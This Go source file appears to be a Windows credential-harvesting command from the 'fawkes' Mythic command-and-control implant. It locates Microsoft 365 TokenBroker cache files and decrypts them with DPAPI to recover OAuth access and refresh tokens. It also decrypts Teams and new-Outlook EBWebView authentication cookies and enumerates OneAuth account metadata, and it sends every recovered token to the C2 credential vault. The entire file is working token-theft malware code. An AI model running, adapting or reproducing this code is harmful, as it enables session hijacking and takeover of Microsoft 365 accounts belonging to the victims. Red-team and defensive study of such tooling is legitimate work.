//go:build windows

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

// credM365Tokens extracts OAuth/JWT tokens from Microsoft 365 applications:
// - TokenBroker cache (.tbres files) — DPAPI-protected token responses
// - Teams EBWebView cookies — Chromium-pattern AES-GCM encrypted cookies
// - Outlook (new) EBWebView cookies — same pattern
func credM365Tokens(args credHarvestArgs) structs.CommandResult {
	var sb strings.Builder
	var allCreds []structs.MythicCredential

	sb.WriteString("Microsoft 365 Token Extraction\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")

	// 1. TokenBroker cache
	tbCreds := credTokenBroker(&sb)
	allCreds = append(allCreds, tbCreds...)

	// 2. EBWebView cookies (Teams + Outlook)
	ewCreds := credEBWebViewTokens(&sb)
	allCreds = append(allCreds, ewCreds...)

	// 3. OneAuth account metadata
	credOneAuth(&sb)

	sb.WriteString(fmt.Sprintf("\nTotal tokens extracted: %d\n", len(allCreds)))

	result := structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
	if len(allCreds) > 0 {
		result.Credentials = &allCreds
	}
	return result
}

// credTokenBroker parses TokenBroker .tbres files for cached OAuth tokens
func credTokenBroker(sb *strings.Builder) []structs.MythicCredential {
	sb.WriteString("--- TokenBroker Cache ---\n")

	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		sb.WriteString("  LOCALAPPDATA not set\n\n")
		return nil
	}

	tbDir := filepath.Join(localAppData, "Microsoft", "TokenBroker", "Cache")
	files, err := filepath.Glob(filepath.Join(tbDir, "*.tbres"))
	if err != nil || len(files) == 0 {
		sb.WriteString("  No .tbres files found\n\n")
		return nil
	}

	sb.WriteString(fmt.Sprintf("  Found %d .tbres files\n", len(files)))

	var creds []structs.MythicCredential
	tokenCount := 0
	errorCount := 0

	for _, f := range files {
		tokens, parseErr := parseTbresFile(f)
		if parseErr != nil {
			errorCount++
			continue
		}
		for _, t := range tokens {
			tokenCount++
			// Truncate token for display
			display := t.token
			if len(display) > 80 {
				display = display[:40] + "..." + display[len(display)-20:]
			}
			sb.WriteString(fmt.Sprintf("  [TOKEN] %s\n", filepath.Base(f)))
			sb.WriteString(fmt.Sprintf("    Resource: %s\n", t.resource))
			sb.WriteString(fmt.Sprintf("    ClientID: %s\n", t.clientID))
			sb.WriteString(fmt.Sprintf("    Type: %s\n", t.tokenType))
			sb.WriteString(fmt.Sprintf("    Value: %s\n", display))
			if t.refreshToken != "" {
				refreshDisplay := t.refreshToken
				if len(refreshDisplay) > 80 {
					refreshDisplay = refreshDisplay[:40] + "..." + refreshDisplay[len(refreshDisplay)-20:]
				}
				sb.WriteString(fmt.Sprintf("    Refresh: %s\n", refreshDisplay))
			}

			// Report access token to Mythic vault
			comment := fmt.Sprintf("TokenBroker %s", t.tokenType)
			if t.resource != "" {
				comment += " for " + t.resource
			}
			creds = append(creds, structs.MythicCredential{
				CredentialType: "token",
				Realm:          t.resource,
				Account:        t.clientID,
				Credential:     t.token,
				Comment:        comment,
			})

			// Report refresh token separately if present
			if t.refreshToken != "" {
				creds = append(creds, structs.MythicCredential{
					CredentialType: "token",
					Realm:          t.resource,
					Account:        t.clientID,
					Credential:     t.refreshToken,
					Comment:        fmt.Sprintf("TokenBroker refresh_token for %s", t.resource),
				})
			}

			// Zero sensitive strings after use
			structs.ZeroString(&t.token)
			structs.ZeroString(&t.refreshToken)
		}
	}

	sb.WriteString(fmt.Sprintf("  Extracted %d tokens (%d files failed to parse)\n\n", tokenCount, errorCount))
	return creds
}

// parseTbresFile reads a UTF-16LE .tbres file, decrypts DPAPI-protected fields,
// and extracts token values
func parseTbresFile(path string) ([]extractedToken, error) {
	raw, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	// Convert UTF-16LE to UTF-8
	jsonStr, err := utf16LEToUTF8(raw)
	if err != nil {
		return nil, fmt.Errorf("UTF-16 decode: %w", err)
	}

	var obj tbresObject
	if err := json.Unmarshal([]byte(jsonStr), &obj); err != nil {
		return nil, fmt.Errorf("JSON parse: %w", err)
	}

	// Only process TokenResponse objects
	if obj.TBDataStoreObject.Header.ObjectType != "TokenResponse" {
		return nil, nil
	}

	// Extract ResponseBytes (DPAPI-protected)
	respBytes, ok := obj.TBDataStoreObject.ObjectData.SystemDefinedProperties["ResponseBytes"]
	if !ok || respBytes.Value == "" {
		return nil, nil
	}

	decoded, err := base64.StdEncoding.DecodeString(respBytes.Value)
	if err != nil {
		return nil, fmt.Errorf("base64 decode: %w", err)
	}

	if !respBytes.IsProtected {
		// Not encrypted, try parsing directly
		return parseTokenResponseJSON(decoded)
	}

	// DPAPI decrypt
	decrypted, err := dpapiDecrypt(decoded)
	if err != nil {
		return nil, fmt.Errorf("DPAPI: %w", err)
	}
	defer structs.ZeroBytes(decrypted)

	return parseTokenResponseJSON(decrypted)
}

// ebWebViewApp defines an application that uses EBWebView for token storage
type ebWebViewApp struct {
	name        string
	localState  string
	cookiesPath string
}

// credEBWebViewTokens extracts encrypted cookies from EBWebView-based M365 apps
func credEBWebViewTokens(sb *strings.Builder) []structs.MythicCredential {
	sb.WriteString("--- EBWebView Token Cookies ---\n")

	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		sb.WriteString("  LOCALAPPDATA not set\n\n")
		return nil
	}

	apps := []ebWebViewApp{
		{
			name:        "Microsoft Teams",
			localState:  filepath.Join(localAppData, "Packages", "MSTeams_8wekyb3d8bbwe", "LocalCache", "Microsoft", "MSTeams", "EBWebView", "Local State"),
			cookiesPath: filepath.Join(localAppData, "Packages", "MSTeams_8wekyb3d8bbwe", "LocalCache", "Microsoft", "MSTeams", "EBWebView", "Default", "Network", "Cookies"),
		},
		{
			name:        "Outlook (New)",
			localState:  filepath.Join(localAppData, "Microsoft", "Olk", "EBWebView", "Local State"),
			cookiesPath: filepath.Join(localAppData, "Microsoft", "Olk", "EBWebView", "Default", "Network", "Cookies"),
		},
	}

	var allCreds []structs.MythicCredential

	for _, app := range apps {
		creds := extractEBWebViewCookies(sb, app)
		allCreds = append(allCreds, creds...)
	}

	sb.WriteString("\n")
	return allCreds
}

// extractEBWebViewCookies extracts auth cookies from a single EBWebView app
func extractEBWebViewCookies(sb *strings.Builder, app ebWebViewApp) []structs.MythicCredential {
	sb.WriteString(fmt.Sprintf("\n  [%s]\n", app.name))

	// Check if the app exists
	if _, err := os.Stat(app.localState); os.IsNotExist(err) {
		sb.WriteString("    Not installed\n")
		return nil
	}

	// Get the Local State directory (parent of Local State file)
	localStateDir := filepath.Dir(app.localState)

	// Get encryption key using existing browser infrastructure
	key, err := getEncryptionKey(localStateDir)
	if err != nil {
		sb.WriteString(fmt.Sprintf("    Failed to get encryption key: %v\n", err))
		return nil
	}
	defer structs.ZeroBytes(key)

	// Check if cookies DB exists
	if _, err := os.Stat(app.cookiesPath); os.IsNotExist(err) {
		sb.WriteString("    No cookies database found\n")
		return nil
	}

	// Open the cookies database using existing browser DB infrastructure
	db, cleanup, err := openBrowserDB(app.cookiesPath)
	if err != nil {
		sb.WriteString(fmt.Sprintf("    Failed to open cookies DB: %v\n", err))
		return nil
	}
	defer cleanup()

	// Query all cookies — we'll filter for auth-relevant ones
	rows, err := db.Query("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
	if err != nil {
		sb.WriteString(fmt.Sprintf("    Failed to query cookies: %v\n", err))
		return nil
	}
	defer rows.Close()

	var creds []structs.MythicCredential
	totalCookies := 0
	authCookies := 0

	for rows.Next() {
		var hostKey, name, path string
		var encValue []byte
		var expiresUTC int64
		var isSecure, isHTTPOnly int

		if err := rows.Scan(&hostKey, &name, &encValue, &path, &expiresUTC, &isSecure, &isHTTPOnly); err != nil {
			continue
		}
		totalCookies++

		// Check if this cookie matches any auth patterns
		desc := matchAuthCookie(hostKey, name)
		if desc == "" {
			continue
		}

		authCookies++

		// Decrypt the cookie value
		var value string
		if len(encValue) > 0 {
			value, err = decryptPassword(encValue, key)
			if err != nil {
				sb.WriteString(fmt.Sprintf("    [!] %s/%s: decrypt failed: %v\n", hostKey, name, err))
				continue
			}
		}

		if value == "" {
			continue
		}

		// Display with truncation
		display := value
		if len(display) > 100 {
			display = display[:50] + "..." + display[len(display)-30:]
		}
		sb.WriteString(fmt.Sprintf("    [COOKIE] %s — %s (%s)\n", name, desc, hostKey))
		sb.WriteString(fmt.Sprintf("      Value: %s\n", display))

		creds = append(creds, structs.MythicCredential{
			CredentialType: "token",
			Realm:          hostKey,
			Account:        name,
			Credential:     value,
			Comment:        fmt.Sprintf("%s %s cookie", app.name, desc),
		})

		structs.ZeroString(&value)
	}
	if err := rows.Err(); err != nil {
		sb.WriteString(fmt.Sprintf("    Row iteration error: %v\n", err))
	}

	sb.WriteString(fmt.Sprintf("    Scanned %d cookies, found %d auth-related\n", totalCookies, authCookies))
	return creds
}

// credOneAuth enumerates OneAuth account metadata (not DPAPI-protected)
func credOneAuth(sb *strings.Builder) {
	sb.WriteString("--- OneAuth Account Metadata ---\n")

	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		sb.WriteString("  LOCALAPPDATA not set\n\n")
		return
	}

	oneAuthDir := filepath.Join(localAppData, "Microsoft", "OneAuth", "accounts")
	entries, err := os.ReadDir(oneAuthDir)
	if err != nil {
		sb.WriteString("  No OneAuth accounts found\n\n")
		return
	}

	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		path := filepath.Join(oneAuthDir, entry.Name())
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}

		// Try to parse as JSON for user-friendly display
		var acct map[string]interface{}
		if err := json.Unmarshal(data, &acct); err == nil {
			// Extract useful fields
			for _, key := range []string{"username", "email", "display_name", "upn", "tenant_id", "environment"} {
				if v, ok := acct[key]; ok {
					sb.WriteString(fmt.Sprintf("  %s: %v\n", key, v))
				}
			}
		} else {
			// Show raw content (truncated)
			content := string(data)
			if len(content) > 500 {
				content = content[:500] + "..."
			}
			sb.WriteString(fmt.Sprintf("  [%s] %s\n", entry.Name(), content))
		}
	}
	sb.WriteString("\n")
}
